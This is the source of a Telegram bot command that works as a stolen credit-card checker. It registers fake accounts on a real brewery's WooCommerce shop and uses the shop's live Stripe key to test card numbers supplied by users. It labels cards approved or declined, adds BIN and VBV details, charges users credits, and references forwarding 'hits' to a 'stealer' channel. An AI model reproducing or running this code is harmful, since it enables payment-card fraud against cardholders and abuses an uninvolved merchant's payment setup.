import requests
import random
import string
import asyncio
import time
import logging
from user_agent import generate_user_agent
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

logging.basicConfig(level=logging.INFO)

STEALER_CHANNEL_ID = -1002549777556

async def stripe_check(card):
    def sync_stripe(card):
        parts = card.split("|")
        n, mm, yy, cvc = parts[0], parts[1], parts[2][-2:], parts[3]

        r = requests.Session()
        user = generate_user_agent()

        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=15))
        email = f"{username}@gmail.com"

        # Get Woocommerce nonce
        try:
            rd = r.get('https://shop.wiseacrebrew.com/account/add-payment-method/',
                       cookies=r.cookies,
                       headers={'user-agent': user}).text.split('name="woocommerce-register-nonce" value="')[1].split('"')[0]
        except:
            rd = ""

        # Register (may fail silently)
        try:
            r.post('https://shop.wiseacrebrew.com/account/add-payment-method/',
                   headers={'user-agent': user},
                   data={'email': email,
                         'password': 'karar1111',
                         'woocommerce-register-nonce': rd,
                         '_wp_http_referer': '/my-account/add-payment-method/',
                         'register': 'Register'})
        except:
            pass

        # Get SetupIntent nonce
        try:
            rei = r.get('https://shop.wiseacrebrew.com/account/add-payment-method/',
                        headers={'user-agent': user}).text.split('"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
        except:
            rei = ""

        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F41ba105bc6%3B+stripe-js-v3%2F41ba105bc6%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fshop.wiseacrebrew.com&time_on_page=172686&client_attribution_metadata[client_session_id]=70a646ff-9da9-44eb-9bf9-d73d09557bf0&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=4071ff8f-9008-4386-b999-9a18be48e358&guid=NA&muid=NA&sid=NA&key=pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy&_stripe_version=2024-06-20'

        # Create Payment method
        try:
            response = r.post('https://api.stripe.com/v1/payment_methods',
                              headers={'user-agent': user},
                              data=data)
            response_json = response.json()
        except Exception as e:
            logging.error(f"Stripe PaymentMethod creation error: {e}")
            response_json = {}

        # Confirm SetupIntent
        try:
            resp = r.post('https://shop.wiseacrebrew.com/',
                          params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
                          headers={'user-agent': user},
                          data={'action': 'create_and_confirm_setup_intent',
                                'wc-stripe-payment-method': response_json.get('id', ''),
                                'wc-stripe-payment-type': 'card',
                                '_ajax_nonce': rei})
            try:
                resp_json = resp.json()
                logging.info(f"Setup Intent Confirmation Response: {resp_json}")
            except:
                resp_json = {"success": False, "data": {}}
        except Exception as e:
            logging.error(f"Setup Intent confirm post error: {e}")
            resp_json = {"success": False, "data": {}}

        status = "DECLINED❌"
        text_resp = "Card Declined ❌"

        # Check status
        if resp_json.get("success") and resp_json.get("data", {}).get("status") == "succeeded":
            status = "APPROVED✅"
            text_resp = "Your Card Successful ✅"
        else:
            try:
                resp_text = resp.text.lower()
                if 'card was declined' in resp_text:
                    text_resp = "Card Declined ❌"
                elif 'your card number is incorrect.' in resp_text:
                    text_resp = "Card Number Incorrect ❌"
                elif 'your card\'s security code is incorrect' in resp_text:
                    text_resp = "Security Code Incorrect ❌"
            except:
                pass

        return {"status": status, "text": text_resp, "bin": n[:6]}

    return await asyncio.to_thread(sync_stripe, card)


@Client.on_message(filters.command("auth1", [".", "/"]))
async def stripe_cmd(Client, message):
    user_id = str(message.from_user.id)
    try:
        checkall = await check_all_thing(Client, message)
        gateway = "Stripe Gate 💎"
        if not checkall[0]:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if getcc is False:
            resp = f"""<b>
Gate Name: {gateway} ♻️
CMD: /stripe

Message: No CC Found in your input ❌

Usage: /stripe cc|mes|ano|cvv</b>"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        bin6 = cc[:6]

        firstresp = f"""
↯ Checking.

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
</b>
"""
        firstchk = await message.reply_text(firstresp, message.id)
        await asyncio.sleep(0.5)

        secondresp = f"""
↯ Checking..

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□
"""
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)
        await asyncio.sleep(0.5)

        start = time.perf_counter()
        result = await stripe_check(fullcc)

        getbin = await get_bin_details(cc)

        thirdresp = f"""
↯ Checking...

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code>
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■
"""
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
        await asyncio.sleep(0.5)

        brand, type_, level, bank, country, flag, currency = ("Unknown",)*7
        if len(getbin) > 0:
            brand = getbin[0]
        if len(getbin) > 1:
            type_ = getbin[1]
        if len(getbin) > 2:
            level = getbin[2]
        if len(getbin) > 3:
            bank = getbin[3]
        if len(getbin) > 4:
            country = getbin[4]
        if len(getbin) > 5:
            flag = getbin[5]
        if len(getbin) > 6:
            currency = getbin[6]

        vbv_status = "Not Found"
        try:
            with open("FILES/vbvbin.txt", "r", encoding="utf-8") as file:
                vbv_data = file.readlines()
            bin_found = False
            for line in vbv_data:
                line = line.strip()
                if not line:
                    continue
                parts = line.split('|')
                if parts[0] == bin6:
                    bin_found = True
                    vbv_status = parts[2] if len(parts) > 2 else parts[1]
                    break
            if not bin_found:
                vbv_status = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
        except FileNotFoundError:
            vbv_status = "VBV BIN file missing"

        proxy_status = "No Proxy"

        finalresp = f"""
{result['status']}
━━━━━━━━━━━━━
[⟐] 𝗖𝗖 - <code>{fullcc}</code>
[⟐] 𝗦𝘁𝗮𝘁𝘂𝘀 : {result['text']}
[⟐] 𝗚𝗮𝘁𝗲 - {gateway}
━━━━━━━━━━━━━
[⟐] 𝗩𝗕𝗩 - {vbv_status}
━━━━━━━━━━━━━
[⟐] B𝗶𝗻 : {bin6}
[⟐] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country} {flag}
[⟐] 𝗜𝘀𝘀𝘂𝗲𝗿 : {bank}
[⟐] 𝗧𝘆𝗽𝗲 : {brand} | {type_} - {level}
━━━━━━━━━━━━━
[⟐] T/t : {time.perf_counter() - start:0.2f}s | Proxy : {proxy_status}
[⟐] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: <a href='tg://user?id={message.from_user.id}'> {message.from_user.first_name}</a> [ {role} ]
[⟐] 𝗢𝘄𝗻𝗲𝗿: <a href=\"tg://user?id=7345217777\">𝑵𝒂𝒊𝒓𝒐𝒃𝒊𝒂𝒏𝒈𝒐𝒐𝒏</a>
╚━━━━━━「𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐂𝐇𝐄𝐂𝐊𝐄𝐑」━━━━━━╝
"""
        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)

        if result['status'] == "APPROVED":
            await send_hit_if_approved(Client, finalresp)

        await setantispamtime(user_id)
        await deductcredit(user_id)

    except Exception:
        print(f"[stripe_cmd ERROR] {traceback.format_exc()}")
        await message.reply_text("An error occurred while processing your request. Please try again later.", quote=True)
